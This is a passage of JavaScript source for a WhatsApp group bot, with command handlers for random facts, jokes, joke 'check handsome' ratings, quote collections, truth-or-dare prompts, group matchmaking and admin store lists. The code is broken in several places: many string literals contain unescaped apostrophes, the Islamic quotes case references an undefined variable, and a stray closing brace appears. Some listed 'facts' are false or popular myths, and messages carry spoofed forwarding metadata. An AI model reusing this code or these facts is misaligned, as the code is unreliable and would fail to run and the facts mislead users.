'🦜 Parrots can mimic human voices because they have unique vocal muscle structures.',
'🐴 Horses can sleep standing up.',
'🐶 Dogs can understand over 150 human words.',
'🌬️ The strongest wind ever recorded on Earth had a speed of 372 km/h.',
'🍯 Honey is the only food that never spoils.',
'🦀 Crabs can walk sideways due to their body structure and legs.',
'🌌 There are more stars in the universe than grains of sand on all the beaches on Earth.',
'🐉 Komodo dragons are the largest lizards in the world.',
'🏊‍♂️ Humans can survive without food for weeks, but only a few days without water.',
'🦎 If a gecko's tail breaks off, it will grow back.',
'🚀 Most of the dust in houses comes from dead human skin cells.'
];
const randomFact = facts[Math.floor(Math.random() * facts.length)];
newReply(`🧠 *Unique Fact*\n\n${randomFact}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'cat facts': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const catFacts = [
'🐾 Cats can jump up to 6 times their body length!',
'🐾 Cat tongues have a rough texture for cleaning fur.',
'🐾 Cats spend about 70% of their lives sleeping.',
'🐾 Cat ears can rotate up to 180 degrees!',
'🐾 Cats have five toes on their front paws, but only four toes on their back paws.',
'🐾 Cats can run up to 48 km per hour! So fast, huh! 😲',
'🐾 Cats can hear high-frequency sounds that humans cannot hear.',
'🐾 Cats can communicate with humans through sounds and body movements.',
'🐾 Cats have 32 muscles in their ears to adjust ear position.',
'🐾 Cats have a sense of smell 14 times sharper than humans!',
'🐾 Cats rub their heads against objects as a way of introduction and to mark their territory.',
'🐾 Some cats can remember specific places even after years have passed.',
'🐾 Cats can see clearly in very low light conditions, almost total darkness!',
'🐾 Domestic cats have many types of sounds, including meowing, growling, and purring!',
'🐾 Cats like to lick their paws after eating to clean themselves and feel more relaxed.',
'🐾 Cats often sleep with half-open eyes to stay alert to threats.',
'🐾 Cats have an amazing ability to sense ground vibrations, such as earthquakes!',
'🐾 Cats have 9 legendary lives (but that's just a myth, okay)!',
'🐾 Cats can sense weather changes, sometimes they're more sensitive than humans.',
'🐾 Cats cannot taste sweet flavors, huh! They only like protein-based foods.'
];
const randomCatFact = catFacts[Math.floor(Math.random() * catFacts.length)];
newReply(randomCatFact);
db.data.users[m.sender].limit -= 1;
break;
}

case 'joke': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const jokes = [
'🤣 Why don't cats like being online? Because they're afraid of the mouse!',
'🤣 What's "discount" in Japanese? Murah-murashii!',
'🤣 Why can't bicycles stand on their own? Because they're tired!',
'🤣 Why do fish never get hit while swimming? Because they always look left and right!',
'🤣 What animal never makes mistakes? Horses, because they're always on the right track!',
'🤣 Why does math make you dizzy? Because if you keep counting, it never ends!',
'🤣 What's the difference between laundry and someone sulking? Laundry gets sun-dried, while someone sulking just stays quiet!',
'🤣 Why does the coconut tree in front of the house need to be cut down? Because if you pull it out, it's heavy!',
'🤣 What chicken makes you tired? Tired chicken (tired)!',
'🤣 If a fish becomes president, who's the vice? Shark... Hiupresident!',
'🤣 Why do computers like working overtime? Because they're afraid of being *shutdown*!',
'🤣 What's "waterfall" in Japanese? Byur-byur-yamashita!',
'🤣 Why do teachers always carry books? Because carrying roof tiles is heavy!',
'🤣 What animal is the richest? Bear... Because it has *bear*-ang!',
'🤣 Why don't crows ever go to the gym? Because they already have *wings*!',
'🤣 Why do rats like going to the cinema? Because there are many *trail*ers (rats willingly)!',
'🤣 What's smaller than an ant? Baby ants!',
'🤣 Why does Superman never wear green clothes? Because the color is already used by Hulk!',
'🤣 Why do red lights cause traffic jams? Because they like to stop in place!',
'🤣 Why is fried rice more popular than white rice? Because white rice makes no sound when cooked!'
];
const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
newReply(randomJoke);
db.data.users[m.sender].limit -= 1;
break;
}

case 'rock paper scissors': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const userChoice = text.toLowerCase();
const choices = ['rock', 'scissors', 'paper'];
const botChoice = choices[Math.floor(Math.random() * choices.length)];
if (!choices.includes(userChoice)) {
return newReply('🧠 Choose between *rock*, *scissors*, or *paper*, Sis/Bro!');
}
let result = '';
if (userChoice === botChoice) {
result = `🤝 Tie! We both chose *${botChoice}*`;
} else if (
(userChoice === 'rock' && botChoice === 'scissors') ||
(userChoice === 'scissors' && botChoice === 'paper') ||
(userChoice === 'paper' && botChoice === 'rock')
) {
result = `🎉 You win! I chose *${botChoice}*`;
} else {
result = `😢 I win! I chose *${botChoice}*`;
}
newReply(result);
db.data.users[m.sender].limit -= 1;
break;
}

case 'check handsome': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const percentage = Math.floor(Math.random() * 100) + 1;
const comment = percentage > 80 ? '🔥 Wow, you're truly melting hearts!' : 
percentage > 50 ? '😎 Pretty handsome, Sis/Bro!' :
'😅 Hmm... confidence is key, Sis/Bro!';
newReply(`👑 *Check Handsome*\n\nYour handsomeness is at *${percentage}%*\n${comment}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'check beautiful': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const percentage = Math.floor(Math.random() * 100) + 1;
const comment = percentage > 80 ? '🔥 Wow, you're truly melting hearts!' : 
percentage > 50 ? '😍 Pretty beautiful, Sis/Bro!' :
'😅 Hmm... confidence is key, Sis/Bro!';
newReply(`👑 *Check Beautiful*\n\nYour beauty is at *${percentage}%*\n${comment}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'check cute': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const percentage = Math.floor(Math.random() * 100) + 1;
const comment = percentage > 80 ? '🔥 Wow, you're truly melting hearts!' : 
percentage > 50 ? '😋 Pretty cute, Sis/Bro!' :
'😅 Hmm... confidence is key, Sis/Bro!';
newReply(`👑 *Check Cute*\n\nYour cuteness is at *${percentage}%*\n${comment}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'check naughty': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const percentage = Math.floor(Math.random() * 100) + 1;
const comment = percentage > 80 ? '🔥 Wow, you're truly melting hearts!' : 
percentage > 50 ? '🤣 Pretty naughty, Sis/Bro!' :
'😅 Hmm... confidence is key, Sis/Bro!';
newReply(`👑 *Check Naughty*\n\nYour naughtiness is at *${percentage}%*\n${comment}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'check waifu': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!quoted) return newReply(`Send/Reply Your Waifu Image With Caption *${prefix + command}*`);
if (!mime) return newReply(`Send/Reply Your Waifu Image With Caption *${prefix + command}*`);
const percentage = Math.floor(Math.random() * 100) + 1;
const comment = percentage > 80 ? '😍 Best waifu of all time!' : 
percentage > 50 ? '😊 Pretty good as a dream waifu!' :
'😬 Ehm, maybe your waifu needs a little upgrade...';
newReply(`💖 *Check Waifu*\n\nYour waifu percentage is *${percentage}%*\n${comment}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'check husbando': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!quoted) return newReply(`Send/Reply Your Husbando Image With Caption *${prefix + command}*`);
if (!mime) return newReply(`Send/Reply Your Husbando Image With Caption *${prefix + command}*`);
const percentage = Math.floor(Math.random() * 100) + 1;
const comment = percentage > 80 ? '😍 Best husbando of all time!' : 
percentage > 50 ? '😊 Pretty good as a dream husbando!' :
'😬 Ehm, maybe your husbando needs a little upgrade...';
newReply(`💖 *Check Husbando*\n\nYour husbando percentage is *${percentage}%*\n${comment}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'check personality': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const personalities = [
'🧠 Intelligent and wise.',
'❤️ Full of love and care.',
'🔥 Passionate and full of energy.',
'🎭 Mysterious and hard to predict.',
'😄 Friendly and pleasant.',
'😎 Cool and calm in any situation.',
'😅 Often gets emotional easily, but kind-hearted.'
];
const randomPersonality = personalities[Math.floor(Math.random() * personalities.length)];
newReply(`🪄 *Check Personality*\n\nYou have the personality:\n${randomPersonality}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'check future': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const futures = [
'💼 Will become a big boss at a renowned company!',
'🏝️ Retire young and live on a tropical island.',
'💖 Will find true love in the near future.',
'📚 Will become a very knowledgeable and respected person.',
'💸 Rich with a successful business!',
'🎭 Your future is full of mystery and surprises!',
'😴 Hmm... your future is still blurry, try again later.'
];
const randomFuture = futures[Math.floor(Math.random() * futures.length)];
newReply(`🔮 *Check Future*\n\nYour future prediction:\n${randomFuture}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'programmer quotes': {
const quotes = [
"Code once, error forever. 🔥",
"If you can copy-paste, why think? 😎",
"Bugs aren't mistakes, they're hidden features. 😉",
"Working ugly code is better than perfect code that never gets done. 🤡",
"Documentation? What's that to eat? 🤔",
"I never create bugs, I just create surprises in the code. 🎁",
"Stack Overflow is half of my brain. 🧠",
"If there's no deadline, programmers won't work. ⏳",
"Refactor tomorrow, what matters now is it works! 🚀",
"Debugging: the process of figuring out why code doesn't work after being sure it should. 🤯",
"My code works? I don't believe it. 💀",
"Simple logic is for newbies, we pros like suffering. 😆",
"Clean code is a myth, what matters is the client doesn't complain. 🤫",
"True programmers: edit 1 line, get 99+ errors. 🎭",
"When the boss says 'just a small edit', it means you have to rewrite everything. 😤",
"Coding from 9 PM to dawn, the error only appears at noon. 🌙☀️",
"Classic case: 'this shouldn't possibly error'... but still errors. 💀",
"The system was stable… until a user tries something weird. 😭",
"Coding is easy, if you know how… unfortunately no one knows. 🤣",
"Programmers are modern magicians: create something from nothing (and errors). 🎩✨",
"If there's no deadline, this code will never be finished. ⏳",
"Programmers are creatures who can make sophisticated apps, but are too lazy to reply to chats. 📵",
"Code is like love, if forced it errors. 💔",
"Every time I say 'it's fixed', there's a new bug tomorrow. 😵‍💫",
"Code works locally, but errors in production. Always. 😭",
"Why do bugs multiply faster than new features? 🐞",
"Juniors fear writing code, seniors fear reading old code. 🤣",
"Programming is like playing a horror game, every time you open a code file you're scared. 👻",
"Old code is sacred, because no one dares to touch it. 🙏",
"Coding is 1% writing code, 99% finding out why it doesn't work. 🔍",
"Client feature request: 'Just add one button'. 🚩🚩🚩",
"Finish making a new system, tomorrow someone asks for additional features. 😤",
"All errors can be fixed… except errors in your own brain. 🧠",
"There are two types of programmers: those who understand their own code, and those who pretend to. 🤡",
"Normal people watch movies for entertainment, programmers read documentation. 📖",
"Manager: 'Just change the color a little', reality is you have to change half the code. 🎨",
"User: 'This app is slow', even though using a potato phone. 🥔",
"My code might be messy, but at least it's neater than my life. 😌",
"Writing code is an art, debugging is criminal. 🚔",
"It's not my fault, it must be the compiler's fault. 😤",
"Code that works on localhost won't necessarily work in the real world. 🌍",
"Software engineer salaries are big, but still have to debug at 2 AM. 😩",
"My life only has two modes: coding or complaining about coding. 🔄",
"The biggest bug in this system is myself. 💀",
"You know it's old code when the person who wrote it has already resigned. 👀",
"Creating bugs is easy, what's hard is pretending not to see them. 🤭",
"A programmer's main skill isn't coding, it's Googling. 🔎",
"If a program works on the first try, something must be wrong. 🚨",
"All code is good… until we read it again tomorrow. 😅",
"True programmers only work when the deadline is right in front of them. ⏳",
"Computer errors can still be fixed, but who's responsible for errors in life? 🤔",
"One important programmer skill: being able to blame others. 🔥",
"Code review is a polite way to say: 'What is this?!' 😆",
"Comments in code are for the future, which unfortunately will never come. 📜",
"A good programmer isn't one who doesn't create bugs, but one who can make excuses when bugs appear. 😜",
"Coding is like cooking… if not careful, everything will be a mess. 🍳",
"Highest stress level: when a bug disappears without reason. 😨",
"Programmers never sleep, they just loop to standby mode. 🔄",
"You know being a programmer is hard when your only conversation partner is console.log(). 🤖"
];
const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
m.reply(randomQuote);
};
break;

case 'sad quotes': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const quotes = [
'💔 "Sometimes, silence is the best way to convey how much this heart hurts."',
'🥀 "You know what hurts more than a broken heart? Fighting alone for a relationship that involves two."',
'😔 "I'm fine, just sometimes tired of pretending to be strong."',
'💬 "You are the reason for my smile, but also the reason for my tears."',
'🌧️ "Rain knows how to cry without sound, just like me."',
'💔 "Unspoken love hurts more than love that's expressed."',
'🖤 "Sometimes, we have to let go of the people we love to find happiness."',
'🌹 "I'd rather stay silent than hurt hearts with words."',
'😭 "You left, but the memories remain."',
'💧 "These tears aren't from foolishness, but from a heart that hoped too much."',
'🥀 "I know we're not the same anymore, but why does it still feel like before?"',
'💔 "Loving you was the best part of my life, and also the worst."',
'🌧️ "I wait for the rain to stop, but my heart remains wet."',
'🌸 "Nothing hurts more than missing someone who no longer cares."',
'💭 "I'm trapped in memories that can never return."',
'🌙 "Sometimes I wonder, do you miss me like I miss you?"',
'💘 "Loving you wasn't a choice, it's a fate hard to accept."',
'🖤 "I try to forget you, but the more I try, the deeper this wound becomes."',
'💔 "Love is beautiful, but often painful when it has to end."',
'🌙 "Your departure is like a star lost in the night sky, irreplaceable."',
'😢 "Pain comes when we want something we can't have."',
'💔 "Life is full of decisions, and I was wrong to choose to love you."',
'🖤 "I learned that sometimes loving hurts more than letting go."',
'🥀 "You are a wound that never heals, yet I keep it in my heart."',
'🌧️ "Rain isn't just from the sky, but also from my heart that's missing you."',
'💘 "Every time I try to forget you, I become more attached to our memories."',
'💔 "I don't know when our love started to fade, but I feel like I'm losing you every day."',
'💭 "What can I do if my heart still hopes for something that no longer exists?"',
'🌙 "I try to understand, but sometimes this heart can't accept reality."',
'💖 "Sometimes, loss teaches us to appreciate what has been lost more."',
'🌹 "You left and I remain here, trapped in memories that can never return."',
'🖤 "I keep searching for answers, but the more I search, the more confused I become."',
'💔 "Our memories always appear, even though I try to forget everything."',
'🌧️ "Love is like rain, comes uninvited, but leaves wounds afterward."',
'💭 "This feeling defeats everything, even my common sense."',
'🌙 "I wonder, have you ever felt the same pain I feel?"',
'💘 "When love turns into memories, all we can do is cry silently."',
'🖤 "I love you, but sometimes love must be accompanied by the courage to let go."'
];
const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
newReply(`💔 *Sad Quotes*\n\n${randomQuote}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'Islamic quotes': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const IslamicQuotes = [
'🌙 "Verily, after hardship comes ease, believe in Allah's promise."',
'🕋 "And call upon Me, I will respond to you." (Quran, Ghafir:60)',
'💫 "Life is full of trials, but Allah will not give a trial beyond His servant's capability."',
'🌹 "When you feel tired, remember Allah is always with those who are patient."',
'🌱 "Prayer is the weapon of the believer, and through prayer, we can change destiny."',
'🌙 "Never feel alone, because Allah always listens to every prayer and complaint."',
'✨ "Every trial in life is Allah's way of showing His mercy."',
'💖 "Allah's love is love that never disappoints. Rely on Him."',
'🕌 "Remember, that every step we take towards Allah will be facilitated by Him."',
'🌟 "Be grateful for everything you have, because every blessing Allah gives is a grace."',
'🕋 "Allah will not change the condition of a people until they change what is in themselves." (Quran, Ar-Ra'd:11)',
'💫 "Never worry about the future, because Allah has prepared the best for you."',
'🌹 "Patience is the key to all ease, and Allah will definitely provide a way out."',
'🕊️ "Life in this world is only temporary, make every step towards the afterlife filled with goodness."',
'🌱 "Trust in Allah after striving, because He is All-Knowing of what is best for His servants."',
'💖 "The best friends in life are those who remind us of Allah."',
'🕋 "Never despair, Allah is always with those who are patient." (Quran, Al-Anfal:46)',
'🌙 "Every prayer offered sincerely will reach Him, because Allah is All-Hearing."',
'✨ "Sincerity in every deed will bring us closer to Allah's love and pleasure."',
'🌟 "If you feel weak, remember that Allah is always there to give strength."',
'🕌 "Be patient, for Allah is with those who are patient." (Quran, Al-Baqarah:153)',
'💭 "Indeed, Allah does not burden a soul beyond that it can bear." (Quran, Al-Baqarah:286)',
'🌺 "Don't give up, Allah always gives the best to His patient servants."',
'💖 "True love is love that reminds us of Allah and His Messenger."',
'✨ "Wait for the best answer from Allah, because He always gives the best at the right time."',
'🌙 "Having faith and trusting in Allah is the best way to achieve peace of heart."'
];
const randomQuote = islamicQuotes[Math.floor(Math.random() * islamicQuotes.length)];
newReply(`🌙 *Islamic Quotes*\n\n${randomQuote}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'psychology quotes': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const psychologyQuotes = [
'🧠 "The greatest power a human has is the ability to control their mind." - Buddha',
'🌱 "Our minds shape our world. If we want change in life, we must start with the mind."',
'💭 "Don't let the past control your future. You have the power to change it now."',
'💡 "Change starts from within, and it happens when we choose to see the world differently."',
'✨ "It's not how many times you fall that matters, but how many times you get back up."',
'🌸 "Happiness doesn't come from outside, but from how we respond to what happens inside us."',
'🧘 "Mental health is important, and taking care of the mind is as important as taking care of the body."',
'🔑 "When you stop wanting what you can't control, you will find peace."',
'🌻 "Try not to be too hard on yourself, you're already doing your best."',
'🎯 "Life is full of uncertainty, and how we respond to it is the key to happiness."',
'💬 "The difficulties you face now are bridges to greater strength."',
'🌙 "If you feel stuck, remember that you have the ability to change at any time."',
'🧠 "Control your mind, and you will control your life."',
'🌱 "True success is not material achievement, but peace in heart and mind."',
'💭 "Self-compassion is the key to freeing yourself from pressure and guilt."',
'🌟 "Positive thinking isn't just about seeing the good, but understanding that every challenge is an opportunity."',
'💡 "The journey to understand yourself is the most beautiful journey that will bring inner peace."',
'🌸 "Learn to accept yourself as you are, because only then can you grow."',
'✨ "Courage isn't the absence of fear, but the ability to keep going despite fear."',
'🌻 "Self-love is the first step to being able to love others sincerely."',
'💭 "When we stop chasing happiness, we actually start finding it in everyday life."',
'🧘 "Self-acceptance is the foundation of good mental health."',
'🎯 "Change begins with the decision to see everything in a more positive way."',
'💡 "Mistakes are part of the learning process, and every small step brings us closer to the goal."',
'🌙 "Don't let fear block your potential. Fear will only shrink your steps."',
'🧠 "There's nothing wrong with not feeling okay. What matters is how you rise from that situation."'
];
const randomQuote = psychologyQuotes[Math.floor(Math.random() * psychologyQuotes.length)];
newReply(`💭 *Psychology Quotes*\n\n${randomQuote}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'can': {
if (!text) return newReply(`Ask something~ \n\nExample: ${prefix + command} can I learn coding?`)
let answers = [`Absolutely!`, `Hmm, I don't think you can.`, `Impossible, sorry.`, `Of course you can!!! Go for it!`]
let result = answers[Math.floor(Math.random() * answers.length)]
let response = `*Can ${text}*\nMy answer: ${result}`
await newReply(response)
}
break

case 'is': {
if (!text) return newReply(`Come on, ask something!\n\nExample: ${prefix + command} is he my soulmate?`)
let answers = [`Yes`, `No`, `Maybe`, `That's absolutely right!`]
let result = answers[Math.floor(Math.random() * answers.length)]
let response = `*Is ${text}*\nMy answer: ${result}`
await newReply(response)
}
break

case 'when': {
if (!text) return newReply(`Hmm, when? Ask me in detail!\n\nExample: ${prefix + command} when will I become successful?`)
let times = ['5 days from now', '10 days from now', '15 days from now', '1 month from now', '3 months from now', '1 year from now', 'Tomorrow!', 'The day after tomorrow!', 'Very soon!']
let result = times[Math.floor(Math.random() * times.length)]
let response = `*When ${text}*\nMy answer: ${result}`
await newReply(response)
}
break

case 'what': {
if (!text) return newReply(`Ask me something, I'm curious too!\n\nExample: ${prefix + command} what is your favorite food?`)
let answers = [`Ask your partner!`, `I don't know, seriously.`, `Hmm, try finding out yourself!`]
let result = answers[Math.floor(Math.random() * answers.length)]
let response = `*What ${text}*\nMy answer: ${result}`
await newReply(response)
}
break

case 'where': {
if (!text) return newReply(`Where is it? Ask me!\n\nExample: ${prefix + command} where is my house?`)
let locations = [`In the mountains`, `On Mars`, `In your heart~`, `In the wilderness`, `Ask your mom.`, `That's a secret!`]
let result = locations[Math.floor(Math.random() * locations.length)]
let response = `*Where ${text}*\nMy answer: ${result}`
await newReply(response)
}
break

case 'how': {
if (!text) return newReply(`Tell me, so I can help!\n\nExample: ${prefix + command} how to make a bot?`)
let answers = [`Hmm, try searching on Google.`, `Seems difficult.`, `Go for it! You definitely can.`, `Sorry, I don't know the answer.`, `Wow, are you seriously asking that? 🤔`]
let result = answers[Math.floor(Math.random() * answers.length)]
let response = `*How ${text}*\nMy answer: ${result}`
await newReply(response)
}
break

case 'rate': {
if (!text) return newReply(`I'll give a rating, just ask!\n\nExample: ${prefix + command} rate my face?`)
let numbers = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
let result = numbers[Math.floor(Math.random() * numbers.length)]
let response = `*Rating for ${text}*\nMy answer: ${result}%`
await newReply(response)
}
break

case 'mymatch': {
if (!m.isGroup) return newReply(`This feature can only be used in groups!`)
let members = participants.map(u => u.id)
let sender = m.sender
let match = members[Math.floor(Math.random() * members.length)]

sock.sendMessage(m.chat, { 
	text: `👫 Your match is...\n@${sender.split('@')[0]} ❤️ @${match.split('@')[0]}\nWow, you two are a perfect match!`, 
	contextInfo: {
		mentionedJid: [sender, match],
		forwardingScore: 999999, 
		isForwarded: true, 
		forwardedNewsletterMessageInfo: {
			newsletterName: channelName,
			newsletterJid: channel,
		},
		externalAdReply: {
			showAdAttribution: true,
			title: botName,
			mediaType: 1,
			previewType: 1,
			body: ownerName,
			thumbnailUrl: imageUrl,
			renderLargerThumbnail: false,
			mediaUrl: website,
			sourceUrl: website
		}
	}
})
}
break

case 'couple': {
if (!m.isGroup) return newReply(`This feature can only be used in groups, be patient!`)
let members = participants.map(u => u.id)
let first = members[Math.floor(Math.random() * members.length)]
let second = members[Math.floor(Math.random() * members.length)]
sock.sendMessage(m.chat, { 
	text: `@${first.split('@')[0]} ❤️ @${second.split('@')[0]}\nWhat's going on here? You two look perfect together! 💖`, 
	contextInfo: {
		mentionedJid: [first, second],
		forwardingScore: 999999, 
		isForwarded: true, 
		forwardedNewsletterMessageInfo: {
			newsletterName: channelName,
			newsletterJid: channel,
		},
		externalAdReply: {
			showAdAttribution: true,
			title: botName,
			mediaType: 1,
			previewType: 1,
			body: ownerName,
			thumbnailUrl: imageUrl,
			renderLargerThumbnail: false,
			mediaUrl: website,
			sourceUrl: website
		}
	}
})
};
break

case 'truth': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const truths = [
'😈 What's the biggest secret you've never told anyone?',
'🤭 Who do you secretly like right now?',
'🫣 Have you ever lied to your best friend? About what?',
'👀 The most embarrassing thing you've ever experienced?',
'💬 If you could go back in time, what would you change?',
'👀 What do you always hide from your friends?',
'😶 What are you most afraid of in life?',
'🤔 What do you regret but can't fix?',
'🤐 Have you done something you don't want others to know?',
'😱 If you could know one big secret from someone, who would you choose?',
'💭 What makes you feel very anxious or afraid?',
'🙈 The worst thing you did in your teenage years?',
'👁️ What are you most proud of about yourself?',
'📚 Is there a major life decision you regret?',
'🧐 What would you do if you knew you only had 1 day left to live?',
'🤐 Is there something you're hiding from someone very close to you?',
'💔 What has broken your heart?',
'🌑 What are you very afraid of but don't want others to know?',
'🔒 What are you hiding from your family?',
'💭 Is there a major decision you made with regret?',
'🛑 What bad habit is hard for you to quit?',
'🤯 Is there something you want to say to someone but are always afraid to say?',
'🙈 What always makes you feel anxious before sleeping?',
'🎭 Who are you most worried about hurting your feelings?',
'🎥 Which movie best describes your life so far?',
'📜 What is the most important goal in your life according to you?'
];
const randomTruth = truths[Math.floor(Math.random() * truths.length)];
newReply(`🤔 *Truth*\n\n${randomTruth}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'dare': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const dares = [
'🔥 Send a chat saying "I like you" to the last person you chatted with!',
'😜 Send a voice note saying "I am the funniest person in the world."',
'🤡 Take a selfie with the weirdest facial expression and send it to the group!',
'🕺 Send a 10-second video of you dancing to your favorite song.',
'📸 Post an IG story with caption "I got dared, please save me!"',
'🎤 Sing your favorite song and send it to a friend!',
'🤳 Take a photo with the most serious expression and send it to the group!',
'🎮 Play a game on your phone for 5 minutes and send a screenshot of your highest score!',
'📱 Send a message to your ex that only says "Hi!"',
'💃 Try freestyle dancing for 20 seconds and send the video to the group!',
'📸 Take a photo of your food and send it to a friend with caption "This is what I ate today, so hungry!"',
'🖋️ Write a message on a whiteboard or paper with big letters "I got dared!" and send a photo!',
'🌍 Record a video of yourself walking backward for 15 seconds and send it to the group!',
'📱 Change your profile picture to a funny image for 1 hour!',
'🥳 Pretend to be a cartoon character for 1 minute and send the video to the group!',
'🥴 Try making the funniest facial expression and send it to your friends!',
'🎧 Listen to a song you really hate for 5 minutes and tell your feelings after!',
'🎬 Record a video of yourself talking about a random topic for 1 minute and send it to the group!',
'🎤 Try to sing a song you don't know well for 30 seconds!',
'🖼️ Draw your face on paper with your left hand, then send a photo!',
'🕶️ Take a photo with the silliest outfit you have and send it to the group!',
'📲 Send the emoji that best represents you to the group!',
'🎨 Create a drawing with objects around you, send a photo of the result!',
'🤩 Pretend to be a celebrity for 2 minutes and record a video!',
'🎁 Buy something you never need and show it to your friends!',
'🤳 Video yourself doing a challenge with your hands above your head for 1 minute!',
'🍕 Take a photo of fast food and caption it "Dinner like cool kids!"',
'🎵 Send a song that reminds you of someone to the group!',
'🔄 Change your WhatsApp status to very random words for 2 hours!'
];
const randomDare = dares[Math.floor(Math.random() * dares.length)];
newReply(`😈 *Dare*\n\n${randomDare}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'list':
case 'store': {
try {
	const keys = Object.keys(db.data.chats[m.chat].liststore);
	if (keys.length === 0) return newReply(`Oops, it seems there are no lists available in this group yet. 😔`);
	let text = `Hello @${m.sender.split("@")[0]}! 🎉 Here are some lists you can check now. Come on, choose what you like! 🛍️\n\n`;
	const result = [];
	const list = [];
	keys.forEach(key => {
		result.push({
			key: key
		});
		list.push({
			header: capitalizeWords(key) + " 🛒",
			title: "Click to view products",
			id: key
		});
	});
	let button = [{
		"name": "single_select",
		"buttonParamsJson": `{
			"title": "Store List 🛍️",
			"sections": [{
				"title": "Explore All Official Stores 🔥",
				"highlight_label": "New",
				"rows": ${JSON.stringify(list)}
			}]
		}`
	}];
	sock.sendButtonText(m.chat, button, text, footer, m)
} catch (error) {
	console.log(error);
	newReply('Failed to perform action, if you're the owner please check console.');
};
}
break;

case 'dellist': {
if (!m.isGroup) return newReply(`Oops, you can only delete lists inside groups! 😅`);
if (!isAdmins && !isCreator) return newReply(`Only admins or creator can delete lists, sorry! 😜`);
try {
	const keys = Object.keys(db.data.chats[m.chat].liststore);
	if (keys.length === 0) return newReply(`No list messages saved in this group yet. 😔`);
	if (!text) return newReply(`Please use the correct format! Example: ${prefix + command} *key*\n*Send command*: ${prefix + command} hello`);
	if (!db.data.chats[m.chat].liststore[text]) return newReply(`Key *${text}* isn't registered in this group. Check again!`);
	delete db.data.chats[m.chat].liststore[text];
	newReply(`List message with key *${text}* successfully deleted. Bye-bye! 👋`);
} catch (error) {
	console.log(error);
	newReply('Failed to perform action, if you're the owner please check console.');
};
}
break;

case 'addlist': {
if (!m.isGroup) return newReply(`You can only add lists in groups! 🫣`);
if (!isAdmins && !isCreator) return newReply(`Only admins or creator can add lists. 😇`);
let args1 = q.split("|")[0].toLowerCase();
let args2 = q.split("|")[1];
if (!q.includes("|")) return newReply(`Use the correct format! *Send command*: ${prefix + command} *key|product*\n*Send command*: ${prefix + command} hello|hi`);
if (db.data.chats[m.chat].liststore[args1]) return newReply(`List with key *${args1}* already exists in this group. 😬`);
try {
	if (/image/.test(mime)) {
		let media = await sock.downloadAndSaveMediaMessage(quoted);
		const url = await CatBox(media);
		db.data.chats[m.chat].liststore[args1] = {
			key: args1,
			response: args2,
			img: url,
			video: ""
		};
		newReply(`List message with key *${args1}* successfully added. Enjoy! 😎`);
	} else if (/video/.test(mime)) {
		let media = await sock.downloadAndSaveMediaMessage(quoted);
		const url = await CatBox(media);
		db.data.chats[m.chat].liststore[args1] = {
			key: args1,
			response: args2,
			img: "",
			video: url
		};
		newReply(`List message with key *${args1}* successfully added. Let's go! 🎥`);
	} else {
		db.data.chats[m.chat].liststore[args1] = {
			key: args1,
			response: args2,
			img: "",
			video: ""
		};
		newReply(`List message with key *${args1}* successfully added. 😄`);
	}
} catch (error) {
	console.log(error);
	newReply('Failed to perform action, if you're the owner please check console.');
};
}
break;

case 'updatelist':
case 'update': {
if (!m.isGroup) return newReply(`Can only update lists in groups! 🫢`);
if (!isAdmins && !isCreator) return newReply(`Only admins or creator can update lists. 😇`);
let args1 = q.split("|")[0].toLowerCase();
let args2 = q.split("|")[1];
if (!q.includes("|")) return newReply(`Use the correct format! *Send command*: ${prefix + command} *key|product*\n*Send command*: ${prefix + command} hello|hi`);
if (!db.data.chats[m.chat].liststore[args1]) return newReply(`Key *${args1}* isn't registered in this group, can't update! 😥`);
try {
	if (/image/.test(mime)) {
		let media = await sock.downloadAndSaveMediaMessage(quoted);
		const url = await CatBox(media);
		db.data.chats[m.chat].liststore[args1] = {
			key: args1,
			response: args2,
			img: url,
			video: ""
		};
		newReply(`List message with key *${args1}* successfully updated. 😎`);
	} else if (/video/.test(mime)) {
		let media = await sock.downloadAndSaveMediaMessage(quoted);
		const url = await CatBox(media);
		db.data.chats[m.chat].liststore[args1] = {
			key: args1,
			response: args2,
			img: "",
			video: url
		};
		newReply(`List message with key *${args1}* successfully updated. 🎬`);
	} else {
		db.data.chats[m.chat].liststore[args1] = {
			key: args1,
			response: args2,
			img: "",
			video: ""
		};
		newReply(`List message with key *${args1}* successfully updated. 🤩`);
	}
} catch (error) {
	console.log(error);
	newReply('Failed to perform action, if you're the owner please check console.');
};
}
break;
case 'add': {
